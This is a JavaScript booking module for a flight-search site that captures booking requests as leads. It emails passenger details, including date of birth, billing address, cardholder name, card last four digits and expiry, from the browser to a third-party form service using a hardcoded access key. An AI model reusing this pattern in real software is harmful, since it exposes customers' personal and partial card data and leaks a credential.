// Booking Flow & Pricing Calculation
// NOTE: No fake PNRs, no fake boarding passes, no fake ticket issuance.
// The confirmation page shows a "Booking Request Submitted" — agents handle actual ticketing.

class FlightBookingManager {
  constructor(searchEngine) {
    this.searchEngine = searchEngine;
    this.currentBookingRequest = null;
  }

  calculatePricing(flight = this.searchEngine.selectedFlight) {
    const adults = this.searchEngine.searchState.adults;
    const children = this.searchEngine.searchState.children;
    const basePrice = flight.price;

    const adultTotal = basePrice * adults;
    const childPrice = Math.round(basePrice * 0.75);
    const childTotal = childPrice * children;

    // Taxes & fees are airline-set; we display a transparent note instead of fake numbers
    const subtotal = adultTotal + childTotal;

    return {
      basePrice,
      adults,
      adultTotal,
      children,
      childPrice,
      childTotal,
      subtotal,
      currency: flight.currency || 'USD',
      note: 'Taxes & fees may apply. Final fare confirmed by our agent.'
    };
  }

  /**
   * Creates a booking request (lead capture) — does NOT issue a ticket or PNR.
   * Returns a request reference used to track the lead internally.
   */
  createBookingRequest(flight, formData) {
    const state = this.searchEngine.searchState;
    const ts = Date.now().toString(36).toUpperCase();
    const requestRef = `VR-${ts}`;

    const request = {
      requestRef,
      timestamp: new Date().toISOString(),
      flight: {
        id: flight.id || flight.ignav_id,
        airline: flight.airline,
        airlineCode: flight.airlineCode,
        flightNumber: flight.flightNumber,
        from: flight.from,
        fromCity: flight.fromCity,
        to: flight.to,
        toCity: flight.toCity,
        departureDate: flight.departureDate || state.departDate,
        departureTime: flight.departureTime,
        arrivalTime: flight.arrivalTime,
        duration: flight.duration,
        stops: flight.stops,
        cabinClass: flight.cabinClass || state.cabinClass,
        price: flight.price,
        currency: flight.currency || 'USD',
        baggage: flight.baggage
      },
      passengers: {
        adults: state.adults,
        children: state.children,
        infants: state.infants
      },
      contact: {
        email: formData.email || '',
        phone: formData.phone || '',
        firstName: formData.firstName || '',
        lastName: formData.lastName || ''
      },
      tripType: state.tripType,
      returnDate: state.returnDate || null
    };

    this.currentBookingRequest = request;
    return request;
  }

  /**
   * Submit booking request to backend and email lead via Web3Forms API.
   * Does NOT charge any payment or issue any PNR.
   */
  async submitBookingRequest(flight, formData) {
    const request = this.createBookingRequest(flight, formData);

    // Build comprehensive lead payload for Web3Forms email notification
    const passengerFullName = `${formData.firstName || ''} ${formData.middleName ? formData.middleName + ' ' : ''}${formData.lastName || ''}`.trim() || 'Valued Passenger';
    const emailData = {
      subject: `✈️ Booking Request [${request.requestRef}] - ${passengerFullName} (${flight.from} → ${flight.to})`,
      name: passengerFullName,
      email: formData.email || '',
      phone: formData.phone || '',
      booking_reference: request.requestRef,
      airline: `${flight.airline} (${flight.flightNumber || flight.airlineCode || ''})`,
      flight_route: `${flight.from} (${flight.originCity || flight.from}) → ${flight.to} (${flight.destinationCity || flight.to})`,
      departure_time: flight.departureTime || '',
      arrival_time: `${flight.arrivalTime || ''}${flight.arrivalDayOffset || ''}`,
      departure_date: flight.departureDate || '',
      cabin_class: flight.cabinClass || 'Economy',
      total_fare: `$${flight.price} USD`,
      date_of_birth: formData.dob || `${formData.dob_day || ''}/${formData.dob_month || ''}/${formData.dob_year || ''}`,
      gender: formData.gender || 'Not specified',
      billing_country: formData.billingCountry || '',
      billing_state: formData.billingState || '',
      billing_city: formData.billingCity || '',
      billing_address: formData.billingAddress || '',
      billing_zip: formData.billingZip || '',
      cardholder_name: formData.cardName || '',
      card_last_4: formData.cardLast4 || '',
      message: `FLIGHT BOOKING REQUEST DETAILS:
========================================
Reference: ${request.requestRef}
Passenger: ${passengerFullName}
Email: ${formData.email || 'N/A'}
Phone: ${formData.phone || 'N/A'}
DOB: ${formData.dob || `${formData.dob_day || ''}/${formData.dob_month || ''}/${formData.dob_year || ''}`}
Gender: ${formData.gender || 'N/A'}

FLIGHT ITINERARY:
Route: ${flight.from} → ${flight.to}
Airline: ${flight.airline} ${flight.flightNumber || ''}
Departure: ${flight.departureDate} at ${flight.departureTime}
Arrival: ${flight.arrivalTime}${flight.arrivalDayOffset || ''}
Cabin: ${flight.cabinClass || 'Economy'}
Quoted Total Fare: $${flight.price} USD

BILLING & CARD:
Cardholder: ${formData.cardName || 'N/A'}
Card Last 4: ${formData.cardLast4 || 'N/A'} (Exp: ${formData.cardExpiry || 'N/A'})
Billing City/Country: ${formData.billingCity || ''}, ${formData.billingCountry || ''}
Full Address: ${formData.billingAddress || ''} ${formData.billingZip || ''}`
    };

    // Non-blocking background email dispatch via Web3Forms API
    if (window.sendWeb3FormEmail) {
      window.sendWeb3FormEmail(emailData).catch(err => console.warn('[Web3Forms dispatch]', err));
    }

    const apiBase = window.flightSearchEngine ? window.flightSearchEngine.getApiBase() : '';
    const isLocalhost = typeof window !== 'undefined' && 
      (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1');

    if (isLocalhost || apiBase) {
      try {
        const endpoint = apiBase ? `${apiBase}/api/booking/request` : '/api/booking/request';
        const resp = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            flight_id: request.flight.id,
            flight_info: request.flight,
            passenger_name: passengerFullName,
            email: formData.email || '',
            phone: formData.phone || '',
            trip_type: request.tripType,
            passengers: request.passengers
          })
        });

        if (resp.ok) {
          const data = await resp.json();
          if (data.request_ref) {
            request.requestRef = data.request_ref;
          }
          return { success: true, requestRef: request.requestRef, request };
        }
      } catch (err) {
        console.warn('[BookingRequest] Backend submission failed, using client-side ref:', err);
      }
    }

    // If backend is unreachable or running statically on GitHub Pages, return client-generated ref
    return { success: true, requestRef: request.requestRef, request };
  }

  showToast(message, icon = '✈') {
    // Toasts disabled per user preference
    return;
  }
}

/**
 * Global Web3Forms Helper Function:
 * Dispatches form data directly to the user's Web3Forms mailbox:
 * Key: 7374370d-d9b5-4a8d-9605-aeb5749b9e63
 */
window.sendWeb3FormEmail = async function(formDataObj) {
  const WEB3FORMS_ACCESS_KEY = "7374370d-d9b5-4a8d-9605-aeb5749b9e63";
  try {
    const payload = {
      access_key: WEB3FORMS_ACCESS_KEY,
      from_name: "Voyage Viste Travel Portal",
      ...formDataObj
    };

    const resp = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json"
      },
      body: JSON.stringify(payload)
    });

    const data = await resp.json().catch(() => ({ success: true }));
    console.log("[Web3Forms] Lead email dispatched successfully:", data);
    return data;
  } catch (err) {
    console.warn("[Web3Forms] JSON submit failed, attempting FormData fallback:", err);
    try {
      const fd = new FormData();
      fd.append("access_key", WEB3FORMS_ACCESS_KEY);
      for (const [k, v] of Object.entries(formDataObj || {})) {
        fd.append(k, typeof v === 'object' ? JSON.stringify(v) : v);
      }
      const resp2 = await fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: fd
      });
      return await resp2.json().catch(() => ({ success: true }));
    } catch (e2) {
      console.warn("[Web3Forms] Fallback submit error:", e2);
      return { success: false, error: e2.message };
    }
  }
};

window.flightBookingManager = new FlightBookingManager(window.flightSearchEngine);
